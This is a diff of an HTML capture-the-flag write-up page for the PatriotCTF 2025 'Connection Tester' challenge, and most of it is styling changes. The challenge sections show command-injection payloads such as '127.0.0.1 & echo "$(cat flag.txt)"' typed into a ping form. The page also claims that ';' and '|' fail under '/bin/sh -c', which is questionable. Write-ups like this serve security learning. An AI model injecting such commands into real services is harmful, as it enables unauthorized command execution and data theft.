@@ -4,7 +4,8 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Connection Tester • syndro</title>
-    <script>
+
+  <script>
     (function() {
       const saved = localStorage.getItem('theme');
       const prefersLight = window.matchMedia('(prefers-color-scheme: light)').matches;
@@ -12,15 +13,14 @@
       else document.documentElement.classList.remove('light');
     })();
   </script>
+
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Roboto+Mono:wght@300;400;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="../../style.css">
+
   <style>
-    :root {
-      --accent: #58a6ff;
-      --green: #3fb950;
-      --purple: #8b5cf6;
-      --pink: #f472b6;
-    }
+    :root { --accent: #58a6ff; --green: #3fb950; --purple: #8b5cf6; --pink: #f472b6; }
+    .light { --accent: #1f6feb; --green: #238636; }
+
     body {
       background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
       color: #e6edf3;
@@ -28,13 +28,12 @@
       min-height: 100vh;
       padding: 40px 20px;
       line-height: 1.8;
+      transition: background 0.5s, color 0.5s;
     }
     .light body { background: #f6f8fa; color: #0d1117; }
 
-    .container {
-      max-width: 1100px;
-      margin: 0 auto;
-    }
+    .container { max-width: 1100px; margin: 0 auto; }
+
     h1 {
       font-family: 'Orbitron', sans-serif;
       font-size: 4.8rem;
@@ -45,24 +44,16 @@
       margin: 20px 0 10px;
       text-shadow: 0 0 30px rgba(88,166,255,0.3);
     }
-    .meta {
-      text-align: center;
-      opacity: 0.85;
-      font-size: 1.2rem;
-      margin-bottom: 60px;
-    }
+    .light h1 { background: linear-gradient(90deg, #1f6feb, #7c3aed, #ec4899); -webkit-background-clip: text; }
+
+    .meta { text-align: center; opacity: 0.85; font-size: 1.2rem; margin-bottom: 60px; }
     .meta span { color: var(--accent); font-weight: bold; }
 
-    h2, h3 {
-      color: var(--accent);
-      margin: 50px 0 20px;
-      font-family: 'Orbitron', sans-serif;
-    }
-    h2 { font-size: 2.2rem; }
-    h3 { font-size: 1.7rem; }
+    h2 { color: var(--accent); margin: 50px 0 20px; font-family: 'Orbitron', sans-serif; font-size: 2.2rem; }
 
     pre {
-      background: #161b22;
+      background: #161b22 !important;
+      color: #f0f6fc !important;
       padding: 20px;
       border-radius: 14px;
       overflow-x: auto;
@@ -70,12 +61,20 @@
       font-size: 1.05rem;
       margin: 25px 0;
     }
+    .light pre {
+      background: #f6f8fa !important;
+      color: #24292f !important;
+      border: 1px solid #d0d7de !important;
+    }
+
     code {
       background: rgba(88,166,255,0.1);
       padding: 4px 10px;
       border-radius: 8px;
       color: var(--green);
     }
+    .light code { background: rgba(30,110,254,0.15); }
+
     img {
       max-width: 100%;
       border-radius: 16px;
@@ -83,6 +82,8 @@
       box-shadow: 0 20px 60px rgba(0,0,0,0.6);
       border: 2px solid rgba(88,166,255,0.3);
     }
+    .light img { box-shadow: 0 15px 40px rgba(0,0,0,0.15); }
+
     .flag {
       background: rgba(0,255,0,0.1);
       padding: 30px;
@@ -96,6 +97,7 @@
       font-family: 'Roboto Mono', monospace;
       letter-spacing: 1px;
     }
+    .light .flag { background: rgba(35,134,54,0.08); border-color: #238636; }
 
     .back {
       position: fixed;
@@ -111,14 +113,8 @@
       transition: all 0.4s ease;
       z-index: 9999;
       font-size: 1.1rem;
-      display: flex;
-      align-items: center;
-      gap: 10px;
     }
-    .back:hover {
-      transform: translateY(-8px) scale(1.05);
-      box-shadow: 0 20px 60px rgba(88,166,255,0.8);
-    }
+    .back:hover { transform: translateY(-8px) scale(1.05); box-shadow: 0 20px 60px rgba(88,166,255,0.8); }
     .light .back { color: white; }
 
     @media (max-width: 768px) {
@@ -128,7 +124,7 @@
   </style>
 </head>
 <body>
-  <a href="../../index.html" class="back">Back</a>
+  <a href="https://syndro-1.github.io/syndro/CTF/PatriotCTF2025/patriotctf2025" class="back">Back</a>
 
   <div class="container">
     <h1>Connection Tester</h1>
@@ -156,31 +152,27 @@ Password: anything</pre>
 
     <h2>3. Discovering the Injection Point</h2>
     <p>The backend likely runs:</p>
-    <pre>/bin/sh -c "ping -c 4 &lt;user_input&gt;"</pre>
+    <pre>/bin/sh -c "ping -c 4 <user_input>"</pre>
     <p>Because of <code>/bin/sh -c</code>, normal separators like <code>;</code> or <code>|</code> are treated as ping arguments → they don’t break out.</p>
-
     <p>But <code>&amp;</code> and <code>&amp;&amp;</code> work perfectly!</p>
 
     <h2>4. Listing Files</h2>
     <p>Payload:</p>
-    <pre>127.0.0.1 &amp; ls</pre>
-    <p>Or better (to avoid ping noise):</p>
-    <pre>127.0.0.1 &amp; echo "$(ls)"</pre>
+    <pre>127.0.0.1 & ls</pre>
+    <p>Or better (no ping noise):</p>
+    <pre>127.0.0.1 & echo "$(ls)"</pre>
 
     <img src="https://github.com/user-attachments/assets/06f5e09b-2914-4605-bb88-452aaf44a51d" alt="Listing files">
-
     <p>→ Reveals <code>flag.txt</code></p>
 
     <h2>5. Reading the Flag</h2>
     <p>Final payload:</p>
-    <pre>127.0.0.1 &amp; cat flag.txt</pre>
-    <p>Or cleaner:</p>
-    <pre>127.0.0.1 &amp; echo "$(cat flag.txt)"</pre>
+    <pre>127.0.0.1 & echo "$(cat flag.txt)"</pre>
 
     <img src="https://github.com/user-attachments/assets/e38815c5-3418-458b-9dd6-315b935b486a" alt="Flag revealed">
 
     <div class="flag">
-      PCTF{C0nnection_t3st3d_and_pwned}
+      PCTF{C0nnection_****}
     </div>
 
     <p>Another day, another ping tool pwned.</p>
